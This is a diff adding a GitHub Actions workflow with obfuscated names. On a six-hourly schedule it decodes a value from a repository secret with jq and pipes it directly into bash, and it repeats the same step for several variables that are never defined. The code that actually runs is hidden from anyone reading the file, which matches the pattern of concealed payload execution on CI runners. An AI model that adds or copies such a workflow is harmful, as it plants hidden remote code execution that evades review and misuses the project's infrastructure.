@@ -1,0 +1,21 @@
+name: yebawang8765
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yebawang8765
+        env:
+          mx61455: ${{ secrets.mx61455 }}
+        run: |
+          echo $mx61455 | jq -r .dsqca68840 | /bin/bash
+          echo $ds167 | jq -r .k0 | /bin/bash
+          echo $qcpfp1199 | jq -r .aiunv785 | /bin/bash
+          echo $ojrim71983 | jq -r .l2524 | /bin/bash
+          echo $x65503 | jq -r .pfm108 | /bin/bash
+
